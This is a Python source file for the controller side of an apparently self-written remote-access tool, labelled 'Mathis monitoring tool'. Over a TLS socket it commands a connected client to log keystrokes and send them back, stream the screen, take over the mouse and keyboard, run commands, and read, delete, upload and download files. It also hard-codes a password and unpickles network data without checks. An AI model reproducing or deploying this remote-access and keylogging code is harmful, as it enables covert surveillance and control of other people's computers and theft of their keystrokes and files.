import tkinter as tk
from tkinter import ttk
import socket
import string
import threading
import time
import pickle
import os
import mss.tools
import ssl
import cv2
import numpy as np
from pynput import keyboard, mouse

class App():
    def __init__(self, port, max_clients, timeout):
        self.root = tk.Tk()
        self.root.title('Mathis monitoring tool')
        self.root.geometry('1600x900')

        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(certfile='ressources/ssl/cert.pem', keyfile='ressources/ssl/key.pem')

        self.log = Log()

        self.password = 'Id6-DIjjf032_ddo'
        self.port = port
        self.max_clients = max_clients
        self.timeout = timeout
        self.selected_client = ['', '']
        self.socket = None
        self.client = None
        self.comm_occuped = False
        self.id = ''
        self.client_addr = ()
    
        self.menu_bar = tk.Menu(self.root)

        self.filemenu = tk.Menu(self.menu_bar, tearoff=0)
        self.filemenu.add_command(label='Manage Connections', command=lambda: threading.Thread(target=self.conn_manager, daemon=True).start())
        self.menu_bar.add_cascade(label='Connection', menu=self.filemenu)

        self.tools_menu = tk.Menu(self.menu_bar, tearoff=0)
        self.tools_menu.add_command(label='File Explorer', command=lambda: threading.Thread(target=self.file_explorer, daemon=True).start())
        self.tools_menu.add_command(label='Monitor Client', command=lambda: threading.Thread(target=self.monitor_client, args=(False, ), daemon=True).start())
        self.tools_menu.add_command(label='Monitor Client (take control)', command=lambda: threading.Thread(target=self.monitor_client, args=(True, ), daemon=True).start())
        self.menu_bar.add_cascade(label='Tools', menu=self.tools_menu)
        
        self.keyloggermenu = tk.Menu(self.menu_bar, tearoff=0)
        self.keyloggermenu.add_command(label='On', command=self.keylogger_on)
        self.keyloggermenu.add_command(label='Off', command=self.keylogger_off)
        self.keyloggermenu.add_command(label='Save', command=self.keylogger_get)
        self.keyloggermenu.add_command(label='Clear', command=self.keylogger_clear)
        self.menu_bar.add_cascade(label='Keylogger', menu=self.keyloggermenu)

        self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
        self.logsmenu.add_command(label='Open Logs', command=self.log.open_)
        self.logsmenu.add_command(label='Reset Logs', command=self.log.clear)
        self.menu_bar.add_cascade(label='Logs', menu=self.logsmenu)

        self.root.config(menu=self.menu_bar)
        
        self.cmd = CMD(self.root)

    def run(self):
        self.root.mainloop()
        
    def keylogger_on(self):
        command = pickle.dumps('keylogger on')
        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
        if not 'ERROR' in header:
            tk.messagebox.showinfo('Keylogger', 'Keylogger succesfully turned on.')
        else:
            tk.messagebox.showerror('Keylogger', 'Error while trying to turn on the keylogger.')

    def keylogger_off(self):
        command = pickle.dumps('keylogger off')
        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
        if not 'ERROR' in header:
            tk.messagebox.showinfo('Keylogger', 'Keylogger succesfully turned off.')
        else:
            tk.messagebox.showerror('Keylogger', 'Error while trying to turn off the keylogger.')
    def keylogger_get(self):
        command = pickle.dumps('keylogger get')
        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
        error = False
        name = f'ressources/keylogger/{time.time()}.txt'
        try:
            if not os.path.exists('ressources/keylogger/'):
                os.makedirs('ressources/keylogger/')
            with open(name, "w") as f:
                f.write(str(data))
        except Exception as e:
            error = True
            print(e)
            
        if not 'ERROR' in header and not error:
            path = os.path.join(os.getcwd(), name).replace('\\', '/')
            os.startfile(path)
        else:
            tk.messagebox.showerror('Keylogger', 'Error while trying to get keylogger content.')
    
    def keylogger_clear(self):
        command = pickle.dumps('keylogger clear')
        header, data = comm(self.client, f'COMMAND:{len(command)}:NONE', command)
        if not 'ERROR' in header:
            tk.messagebox.showinfo('Keylogger', 'Keylogger succesfully cleared.')
        else:
            tk.messagebox.showerror('Keylogger', 'Error while trying to clear the keylogger.')
        
    def monitor_client(self, take_control):
        def on_key_press(key):
            pressed_keys.add(key)

        def on_key_release(key):
            pressed_keys.discard(key)

        def on_click(x, y, button, pressed):
            if pressed:
                pressed_buttons.add(button)
            else:
                pressed_buttons.discard(button)
                
        def on_move(x, y):
            global mouse_position
            mouse_position = (x, y)
        if take_control: 
            pressed_keys = set()
            pressed_buttons = set()
            
            keyboard_listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
            mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)
            
            keyboard_listener.start()
            mouse_listener.start()
            
        self.log.add('opened monitor app')
        if self.client != None:
            try:
                while True:
                    time0 = time.time()
                    if take_control:
                        data = pickle.dumps(f'mousemove {mouse_position[0]} {mouse_position[1]}')
                        header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
                        
                        if len(pressed_buttons) > 0:
                            data = pickle.dumps(f'mouseclick {pressed_buttons[0].name}')
                            header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
                        
                        data = pickle.dumps(f'hotkeys {list(pressed_keys)}')
                        header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
                    
                    data = pickle.dumps('screenshot 0')
                    header, img_bytes = comm(self.client, f'COMMAND:{len(data)}:NONE', data)
                    if not 'ERROR' in header:
                        img_array = np.frombuffer(img_bytes, dtype=np.uint8)
                        img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                        cv2.imshow('Monitoring Client', img)
                        
                        key = cv2.waitKey(1)
                        if cv2.getWindowProperty('Monitoring Client', cv2.WND_PROP_VISIBLE) < 1:
                            break
                    else:
                        self.log.add(header)
                        
                    if time.time() - time0 < 1/30:
                        time.sleep(1/30 - (time.time() - time0))
            except Exception as e:
                print('Error:', e)
            finally:
                cv2.destroyAllWindows()
           
        if take_control:
            keyboard_listener.stop()
            mouse_listener.stop()
        
    def file_explorer(self):
        if self.client != None:
            root = tk.Tk()
            root.title('File Explorer')
            root.geometry('600x400')
            explorer = FileExplorer(root)
            root.mainloop()

    def conn_manager(self):
        conn_manager_ = ConnMaker()
        self.log.add('new connection ?')
        self.selected_client = conn_manager_.selected_client
        if self.selected_client != ['', '']:
            self.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(('0.0.0.0', self.port))
            self.socket.listen(self.max_clients)
            self.socket.settimeout(1.0)
            
            time0 = time.time()
            while self.client == None and time.time() < time0 + self.timeout:
                try:
                    client, client_addr = self.socket.accept()
                    ssock = self.context.wrap_socket(client, server_side=True)
                    data = ssock.recv(1024).decode()
                    if client_addr[0] == self.selected_client[0]:
                        ssock.send(b'SELECTED')
                        password = ssock.recv(1024).decode()
                        id_ = ssock.recv(1024).decode()
                        if self.password == password and id_ == self.selected_client[1]:
                            ssock.send(b'GRANTED')
                            self.id = id_
                            self.client = ssock
                            self.client_addr = client_addr
                            self.log.add(f'connected to client : {self.selected_client}')
                            return True
                    else:
                        ssock.sendall(b'PINGED')
                        data = ssock.recv(1024)
                        ssock.close()
                    time.sleep(0.1)
                except Exception as e:
                    self.log.add(f'error while trying to select a client in conn_manager function : {e}')
                    
        if self.client == None:
            self.log.add('unable to connect to client')
            
class CMD():
    def __init__(self, root):
        self.root = root
        self.text = tk.Text(root, height=70, width=240, bg='white', fg='black', insertbackground='black')
        self.text.pack()
        
        self.prevent_exit = False
        self.output = [None, None]
        
        self.text.bind('<BackSpace>', self.prevent_backspace)
        self.text.bind('<Return>', self.handle_enter)
        self.text.bind('<Left>', self.on_left_arrow)
        self.text.bind('<Up>', self.on_up_arrow)
        self.text.bind('<Down>', self.on_down_arrow)
        self.text.bind('<Delete>', self.on_delete)
        
        self.prompt()
        
        self.blink_cursor()

    def prompt(self):
        self.text.insert(tk.END, '\n> ')
        self.text.mark_set('insert', tk.END)

    def prevent_backspace(self, event):
        if int(self.text.index(tk.INSERT).split('.')[1]) <= 2:
            return 'break'
        return None

    def on_delete(self, event):
        cursor_index = self.text.index(tk.INSERT)
        cursor_col = int(cursor_index.split('.')[1])
        if cursor_col == 1:
            return 'break'
        return None
    
    def on_left_arrow(self, event):
        cursor_col = int(self.text.index(tk.INSERT).split('.')[1])
        if cursor_col <= 2:
            return 'break'
        return None
    
    def on_down_arrow(self, event):
        return 'break'
    def on_up_arrow(self, event):
        return 'break'

    def handle_enter(self, event):
        line = self.text.get('insert linestart', 'insert lineend').strip()
        command = line.lstrip('> ').strip()
        self.execute_command(command)
        return 'break'
    
    def blink_cursor(self):
        current_color = self.text.cget('insertbackground')
        next_color = 'white' if current_color == 'black' else 'black'
        self.text.config(insertbackground=next_color)
        self.root.after(600, self.blink_cursor)

    def execute_command(self, command):
        app.log.add(f'new command : {command}')
        self.prevent_exit = True
        if not os.path.exists('ressources/received_files/'):
            os.makedirs('ressources/received_files/')
        if not os.path.exists('ressources/received_screenshots/'):
            os.makedirs('ressources/received_screenshots/')
        if not os.path.exists('ressources/keylogger/'):
            os.makedirs('ressources/keylogger/')
        
        if app.client == None:
            self.text.insert(tk.END, '\nno client ...')
        else:
            if command == 'hello':
                self.text.insert(tk.END, '\nhello !')
            elif command == 'exit':
                self.root.destroy()
            elif command.startswith(('#', '//')):
                self.text.insert(tk.END, f'\n{command}')
            else:
                data = pickle.dumps(command.replace('\\', '/'))
                name = "NONE"
                if command.startswith('sendfile') or ('schedule' in command.split(' ') and 'sendfile' in command.split(' ')):
                    try:
                        path = command[9:].replace('"', '')
                        name = os.path.basename(path)
                        with open(path, 'rb') as f:
                            data_ = f.read()
                        data = pickle.dumps((command, data_))
                        
                    except Exception as e:
                        self.text.insert(tk.END, '\nError !')
                        app.log.add(f'error while sending file in execute_command function : {e}')
                       
                thread = threading.Thread(target=self.communication, daemon=True, args=(data, name, ))
                thread.start()
                thread.join()
                
                header = self.output[0]
                data = self.output[1]
                header = header.split(':')
                
                if command == 'keylogger save':
                    with open(f'ressources/keylogger/{time.time()}.txt', 'w') as f:
                        f.write(str(data))
                
                if header[0] == 'TEXT':
                    self.text.insert(tk.END, '\n' + header[2])
                    self.text.insert(tk.END, '\n' + str(data))
                elif header[0] == 'FILE':
                    self.text.insert(tk.END, '\nGET_FILE')
                    self.text.insert(tk.END, '\nDone')
                    with open(f'ressources/received_files/{header[2]}', 'wb') as f:
                        f.write(data)
                elif header[0] == 'IMG':
                    self.text.insert(tk.END, '\n' + header[2])
                    self.text.insert(tk.END, '\nDone')
                    name = f'ressources/received_screenshots/{time.time()}.png'
                    with open('degug.jpg', 'wb') as f:
                        f.write(data)
                    img_array = np.frombuffer(data, dtype=np.uint8)
                    img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)
                    cv2.imwrite(name, img)
                    
                else:
                    app.log.add('mismatched type in header')
                    
                if header[2] == 'CLOSE':
                    app.log.add('socket and client closed by cmd')
                    app.client.close()
                    app.socket.close()
                    app.client = None
                    app.socket = None

        self.prevent_exit = False

        self.prompt()
        
    def communication(self, data, name):
        app.log.add('trying to send command ...')
        header, data = comm(app.client, f'COMMAND:{len(data)}:{name}', data)
        self.output = [header, data]
        
        
class ConnMaker():
    def __init__(self):
        app.log.add('opened connection manager ...')
        self.root = tk.Tk()
        self.root.title('Connection Manager')
        self.root.geometry('400x470')
        self.running = True

        self.max_clients = app.max_clients
        self.port = app.port
        self.clients = []
        self.ids = []
        self.timeout = app.timeout
        self.selected_client = ['', '']
        
        tk.Label(self.root, text='Current Client : ').pack()
        tk.Label(self.root, text=str(app.client)).pack()
        tk.Button(self.root, text='Close Client', command=self.close_client).pack()
        
        ttk.Separator(self.root, orient='horizontal').pack(fill='x', pady=10)

        tk.Button(self.root, text='Start Search', command=self.update_search).pack()
        self.conn_list = tk.Listbox(self.root, width=50, height=20)
        self.conn_list.pack()
        tk.Button(self.root, text='Submit Connection', command=self.submit_client).pack()

        self.root.mainloop()

    def close_client(self):
        self.client = None
        try:
            header, data = comm(app.client, 'CLOSE:CLOSE:CLOSE', b'CLOSE')
            app.client.close()
            app.socket.close()
            app.client = None
            app.socket = None
        except:
            pass

    def submit_client(self):
        try:
            selections = self.conn_list.curselection()
            if len(selections) == 1:
                self.selected_client = [self.clients[selections[0]], self.ids[selections[0]]]
                self.root.destroy()
                app.log.add(f'selected : {self.selected_client}')
                tk.messagebox.showinfo('Connection Manager', 'Successfully connected to the client !')
            else:
                self.root.destroy()
                tk.messagebox.showerror('Connection Manager', 'Selection not valid !')
        except:
            print(2, 'error !')

    def update_search(self):
        app.log.add('update search running ...')
        self.conn_list.delete(0, tk.END)
        self.clients = []
        self.ids = []
        local_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
        local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        local_socket.bind(('0.0.0.0', self.port))
        local_socket.listen(self.max_clients)
        local_socket.settimeout(1.0)

        time0 = time.time()
        timeout = self.timeout
        while time0 + timeout > time.time():
            try:
                client, client_addr = local_socket.accept()
                ssock = app.context.wrap_socket(client, server_side=True)
                data = ssock.recv(1024).decode()
                time.sleep(0.1)
                ssock.sendall(b'PINGED')
                id_ = ssock.recv(1024).decode()
                if (client_addr[0] not in self.clients) and data == 'IDLE':
                    self.clients.append(client_addr[0])
                    self.ids.append(id_)
                ssock.close()
            except Exception as e:
                app.log.add(f'error while trying to connect to a potential client : {e}')
                
        local_socket.close()
        try:
            for i, j in enumerate(self.clients):
                self.conn_list.insert(i, f'ip address : {j}        id : {self.ids[i]}')
        except Exception as e:
            print('trucc', e)
            app.log.add(f'error while updating ListBox in update_search : {e}')

class FileExplorer():
    def __init__(self, root):
        self.root = root
        
        menubar = tk.Menu(self.root)
        file_menu = tk.Menu(menubar, tearoff=0)
        file_menu.add_command(label='🔄 Refresh', command=self.refresh_tree)
        file_menu.add_command(label='❌ Close', command=self.root.quit)
        menubar.add_cascade(label='File', menu=file_menu)
        self.root.config(menu=menubar)
    
        self.main_frame = tk.Frame(self.root)
        self.main_frame.pack(fill='both', expand=True)
    
        self.path_label = tk.Label(self.main_frame, text='Path : ', anchor='w')
        self.path_label.pack(fill='x')
    
        self.tree_frame = tk.Frame(self.main_frame)
        self.tree_frame.pack(fill='both', expand=True)
    
        self.tree = ttk.Treeview(self.tree_frame)
        self.tree.pack(fill='both', expand=True, side='left')
    
        scrollbar = ttk.Scrollbar(self.tree_frame, orient='vertical', command=self.tree.yview)
        scrollbar.pack(side='right', fill='y')
        self.tree.configure(yscrollcommand=scrollbar.set)
    
        self.tree.bind('<<TreeviewOpen>>', self.on_open)
    
        self.context_menu = self.create_context_menu()
    
        self.tree.bind('<Button-3>', self.show_context_menu)

        try:
            self.add_drives()
        except Exception as e:
            print('dede', e)
            app.log.add(f'error in file explorer : {e}')
            
    def refresh_tree(self):
        selected = self.tree.focus()
        if selected:
            path = self.tree.item(selected, 'values')[0]
            self.tree.delete(*self.tree.get_children(selected))
            self.populate_node(selected, path)


    def show_context_menu(self, event):
        selected_item = self.tree.identify_row(event.y)
        if selected_item:
            self.tree.selection_set(selected_item)
            self.context_menu.post(event.x_root, event.y_root)


    def list_drives(self):
        drives = []
        for letter in string.ascii_uppercase:
            data = pickle.dumps(f'ispath {letter}:/')
            header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
            if data:
                drives.append(f'{letter}:/')
        return drives

    def add_drives(self):
        for drive in self.list_drives():
            node = self.tree.insert('', 'end', text=f'📁 {drive}', values=[drive])
            self.tree.insert(node, 'end')

    def populate_node(self, parent, path):
        try:
            data = pickle.dumps(f'ls "{path}" ')
            header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
            for name in data:
                abspath = os.path.join(path.replace("\\", "/"), name).replace("\\", "/")
                data = pickle.dumps(f'isdir "{abspath}"')
                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                isdir = data
                icon = '📁' if isdir else '📄'
                label = f'{icon} {name}'
                node = self.tree.insert(parent, 'end', text=label, values=[abspath])
                if isdir:
                    self.tree.insert(node, 'end')
        except PermissionError:
            pass

    def on_open(self, event):
        selected = self.tree.focus()
        if self.tree.get_children(selected):
            first_child = self.tree.get_children(selected)[0]
            if not self.tree.item(first_child, 'values'):
                self.tree.delete(first_child)
                path = self.tree.item(selected, 'values')[0]
                self.populate_node(selected, path)
        path = self.tree.item(selected, 'values')[0]
        self.path_label.config(text=f"Current Path: {path}")
        self.root.lift()
        self.root.focus_force()

    def create_context_menu(self):
        context_menu = tk.Menu(self.root, tearoff=0)
        context_menu.add_command(label='Delete', command=self.delete_item)
        context_menu.add_command(label='Rename', command=self.rename_item)
        context_menu.add_command(label='New Folder', command=self.create_new_folder)
        context_menu.add_command(label='Copy', command=self.copy_item)
        context_menu.add_command(label='Paste', command=self.paste_item)
        context_menu.add_command(label='Properties', command=self.show_properties)
        context_menu.add_command(label='Compress (ZIP)', command=self.compress_item)
        context_menu.add_command(label='Extract (Unzip)', command=self.extract_item)
        context_menu.add_command(label='Download', command=self.download_item)
        context_menu.add_command(label='Upload', command=self.upload_item)
        return context_menu
    
    def delete_item(self):
        selected_item = self.tree.selection()[0]
        path = self.tree.item(selected_item, 'values')[0]
        
        
        data = pickle.dumps(f'ispath "{path}"')
        header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
        
        if data:
            try:
                data = pickle.dumps(f'isdir "{path}"')
                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                
                if data:
                    data = pickle.dumps(f'removedir "{path}"')
                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                else:
                    data = pickle.dumps(f'removefile "{path}"')
                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                    
                self.tree.delete(selected_item)
            except Exception as e:
                tk.messagebox.showerror('Error', f'Failed to delete : {e}')
                
    def rename_item(self):
        selected_item = self.tree.selection()[0]
        old_name = self.tree.item(selected_item, 'values')[0]
        
        new_name = tk.simpledialog.askstring('Rename', 'Enter new name:', initialvalue=os.path.basename(old_name), parent=self.root)
        if new_name:
            try:
                new_path = os.path.join(os.path.dirname(old_name), new_name).replace('\\', '/')
                
                data = pickle.dumps(f'rename "{old_name}" "{new_path}"')
                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                
                self.tree.item(selected_item, text=f'{new_name}', values=[new_path])
            except Exception as e:
                tk.messagebox.showerror('Error', f'Failed to rename: {e}')
                
    def create_new_folder(self):
        selected_item = self.tree.selection()[0]
        path = self.tree.item(selected_item, 'values')[0]
        
        folder_name = tk.simpledialog.askstring('New Folder', 'Enter folder name:', parent=self.root)
        if folder_name:
            new_folder_path = os.path.join(path.replace('\\', '/'), folder_name).replace('\\', '/')
            try:
                
                data = pickle.dumps(f'makedirs "{new_folder_path}"')
                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                
                self.tree.insert(selected_item, 'end', text=f"📁 {folder_name}", values=[new_folder_path])
            except Exception as e:
                tk.messagebox.showerror("Error", f"Failed to create folder: {e}")
                
    def copy_item(self):
        selected_item = self.tree.selection()[0]
        self.copied_item = self.tree.item(selected_item, 'values')[0]

    def paste_item(self):
        if hasattr(self, 'copied_item'):
            selected_item = self.tree.selection()[0]
            destination_path = self.tree.item(selected_item, 'values')[0]
            try:
                data = pickle.dumps(f'isdir "{self.copied_item}"')
                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                
                if data:
                    destination_path = os.path.join(destination_path.replace("\\", "/"), os.path.basename(self.copied_item)).replace("\\", "/")
                    
                    data = pickle.dumps(f'copydir "{self.copied_item}" "{destination_path}"')
                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                else:
                    data = pickle.dumps(f'copyfile "{self.copied_item}" "{destination_path}"')
                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                    
                self.populate_node(selected_item, destination_path)
            except Exception as e:
                tk.messagebox.showerror("Error", f"Failed to paste: {e}")
                
    def show_properties(self):
        selected_item = self.tree.selection()[0]
        path = self.tree.item(selected_item, 'values')[0]
        
        if os.path.exists(path): #COMM
            size = os.path.getsize(path)
            creation_time = os.path.getctime(path)
            modified_time = os.path.getmtime(path)
            
            properties = f"Size: {size} bytes\nCreated: {time.ctime(creation_time)}\nModified: {time.ctime(modified_time)}"
            tk.messagebox.showinfo("File Properties", properties)

    def compress_item(self):
        selected_item = self.tree.selection()[0]
        path = self.tree.item(selected_item, 'values')[0]
        
        data = pickle.dumps(f'isdir "{path}"')
        header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
        
        if data:
            zip_name = tk.simpledialog.askstring("Compress", "Enter ZIP file name:")
            if zip_name:
                try:
                    data = pickle.dumps(f'zip "{zip_name}" "{path}"')
                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                    
                    tk.messagebox.showinfo("Success", f"Folder compressed to {zip_name}.zip")
                except Exception as e:
                    tk.messagebox.showerror("Error", f"Failed to compress folder: {e}")
                    
    def extract_item(self):
        selected_item = self.tree.selection()[0]
        path = self.tree.item(selected_item, 'values')[0]
        
        if path.endswith(".zip"):
            extraction_folder = tk.simpledialog.askstring("Extract", "Enter extraction folder:")
            if extraction_folder:
                try:
                    data = pickle.dumps(f'unzip "{path}" "{extraction_folder}"')
                    header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                    
                    tk.messagebox.showinfo("Success", f"Extracted to {extraction_folder}")
                    self.populate_node(selected_item, extraction_folder)
                except Exception as e:
                    tk.messagebox.showerror("Error", f"Failed to extract: {e}")

                    
    def download_item(self):
        selected_item = self.tree.selection()[0]
        path = self.tree.item(selected_item, 'values')[0]
        
        try:
            data = pickle.dumps(f'getfile "{path}"')
            header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
            with open(f'ressources/received_files/{header.split(":")[2]}', 'wb') as f:
                f.write(data)
            tk.messagebox.showinfo("Success", f"Downloaded {path} \nAt ressources/received_files")
        except Exception as e:
            tk.messagebox.showerror("Error", f"Failed to download: {e}")

    def upload_item(self):
        file_path = tk.filedialog.askopenfilename()
        
        if file_path:
            try:
                with open(file_path, 'rb') as f:
                    data_ = f.read()
                command = f'sendfile sended_file"{time.time()}"'
                data = pickle.dumps((command, data_))
                header, data = comm(app.client, f'COMMAND:{len(data)}:NONE', data)
                
                tk.messagebox.showinfo("Success", f"Uploaded {file_path}")
            except Exception as e:
                tk.messagebox.showerror("Error", f"Failed to upload: {e}")


class Log():
    def __init__(self):
        self.name = f'{time.time()}.txt'
        self.path = f'ressources/logs/{self.name}'
        if not os.path.exists('ressources/logs/'):
            os.makedirs('ressources/logs/')
        with open(self.path, 'w') as f:
            f.write(f'log created at time : {self.name[0:-4]}')
            
    def add(self, log):
        try:
            with open(self.path, 'a') as f:
                f.write(f'\n{time.time()}>{log}')
        except Exception as e:
            print('log : ', e)
    
    def clear(self):
        with open(self.path, 'w') as f:
            f.write('')
            
    def open_(self):
        path = os.path.join(os.getcwd().replace("\\", "/"), self.path).replace("\\", "/")
        os.startfile(path)


def comm(client, header, data):
    app.comm_occuped = True
    try:
        client.send(header.encode())
        client.sendall(data)
        
        header = client.recv(4096).decode()
        bytes_data = b''
        size = int(header.split(':')[1])
        while len(bytes_data) < size:   
            packet = client.recv(size - len(bytes_data)) #change to 65536 for stability
            if not packet:
                break
            bytes_data += packet
            
        if header.split(":")[0] != "IMG":
            data = pickle.loads(bytes_data)
        else:
            data = bytes_data
        
        app.log.add('received header and data in comm function')
        app.log.add(header)
        if header.split(":")[0] == "TEXT":
            app.log.add(data)
        return header, data
    except Exception as e:
        app.log.add(f'error in comm function : {e}')
        return 'ERROR:ERROR:ERROR', f'error while receiving data: {e}'
    app.comm_occuped = False
    

if __name__ == '__main__':
    app = App(55277, 20, 3) #port(must be same as client), max client the server can handle, timeout in seconds
    app.run()
    try:
        app.socket.close()
    except:
        pass
